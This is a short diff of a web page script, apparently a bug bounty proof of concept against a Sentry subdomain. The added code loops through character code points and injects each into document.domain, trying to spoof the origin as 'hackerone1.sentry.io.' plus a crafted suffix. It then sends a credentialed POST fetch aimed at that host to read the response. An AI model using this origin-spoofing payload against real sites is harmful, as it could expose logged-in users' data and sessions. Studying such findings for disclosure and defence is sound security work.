@@ -4,9 +4,9 @@
   <script>
     window.onload = () => {
       let headers = {};
-      //for (let i = 0; i <= 0x10fff; i++) {
+      for (let i = 0; i <= 0x10ff; i++) {
         try {
-          document.domain = "hackerone1.sentry.io.%0a\n.section.app"
+          document.domain = "hackerone1.sentry.io."+String.fromCodePoint(i)+".section.app"
           fetch("https://", { method: 'POST', credentials: "include", Host:"hackerone1.sentry.io"}).then(resp => console.log(resp.text()))
         } catch (e) { console.log(e) }
       }
